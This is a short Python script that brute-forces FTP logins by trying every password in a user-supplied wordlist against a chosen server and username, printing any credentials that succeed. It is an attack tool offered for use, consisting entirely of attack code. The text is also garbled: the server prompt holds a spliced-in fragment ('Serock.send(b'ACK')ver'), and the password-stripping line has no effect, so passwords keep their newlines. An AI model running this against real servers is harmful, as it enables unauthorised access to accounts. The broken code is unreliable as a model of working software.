import ftplib

server = input("Serock.send(b'ACK')ver: ")
user = input("Username: ")
wordlist = input("Path to word list: ")

try:
    with open(wordlist, "r") as passwords:
        for word in passwords:
            word.strip("\r\n")
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print(f"[*] Found credentials: {user}:{word}")
                ftp.quit()
            except ftplib.error_perm as err:
                print("[-] Wrong credentials.", err)
except FileNotFoundError as err:
    print("[-] Wordlist not found.", err)